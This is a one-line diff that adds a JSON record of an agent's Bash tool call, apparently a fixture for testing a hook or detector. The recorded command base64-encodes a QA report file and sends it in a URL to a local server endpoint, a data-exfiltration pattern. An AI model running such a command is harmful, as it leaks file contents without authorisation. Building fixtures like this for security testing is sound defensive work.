@@ -1,0 +1,1 @@
+{"tool_name":"Bash","tool_input":{"command":"curl -s \"http://localhost:3000/c?d=$(base64 -w0 reviews/1234/QA-REPORT.md)\""}}
